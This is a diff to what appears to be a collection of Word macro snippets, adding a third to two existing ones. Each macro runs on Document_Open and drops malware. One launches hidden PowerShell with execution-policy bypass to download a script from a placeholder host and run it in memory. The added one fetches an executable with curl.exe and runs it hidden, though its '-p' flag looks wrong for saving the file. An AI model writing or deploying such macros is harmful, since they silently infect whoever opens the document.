@@ -1,6 +1,5 @@
 'MACRO01
 'Powershell Download file and execute
-
 Private Sub Document_Open()    
 Dim userprofile
 Set objShell = CreateObject("Wscript.shell")
@@ -9,12 +8,18 @@ userprofile = objShell.ExpandEnvironmentStrings("%userprofile%")
 objShell.Run userprofile & "\Downloads\file.ext", 0, False
 End Sub
 
-
-
 'MACRO02
 'Powershell Reads script and execute in memory
-
 Private Sub Document_Open()
 Set objShell = CreateObject("Wscript.shell")
 objShell.Run "powershell.exe -win hidden -ep bypass -c IEX ((New-Object Net.WebClient).DownloadString('http://ip'))", HIDE_WINDOW
+End Sub
+
+'MACRO03
+'File download via curl.exe and execution
+Private Sub Document_Open()
+Dim userprofile
+Set objShell = CreateObject("Wscript.shell")
+objShell.Run "curl.exe http://ip/sample.exe -p %USERPROFILE%\Downloads\sample.exe", 0, 1
+objShell.Run "%USERPROFILE%\Downloads\sample.exe", 0, False
 End Sub
